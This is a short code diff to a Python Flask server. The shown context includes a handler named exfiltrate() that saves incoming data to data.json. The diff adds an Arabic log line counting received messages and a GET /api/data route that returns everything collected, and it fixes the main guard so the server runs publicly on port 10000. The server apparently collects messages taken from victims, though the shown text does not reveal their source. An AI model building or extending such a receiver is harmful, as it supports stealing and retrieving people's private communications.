@@ -43,7 +43,12 @@ def exfiltrate():
     with open('data.json', 'w') as f:
         json.dump(data, f, indent=2)
     
+    print(f"[{datetime.datetime.now()}] استقبال {len(d.get('messages', []))} رسالة")
     return jsonify({"status": "ok"})
 
-if __name__ == "main":
+@app.route('/api/data', methods=['GET'])
+def get_data():
+    return jsonify(data)
+
+if __name__ == "__main__":
     app.run(host='0.0.0.0', port=10000)
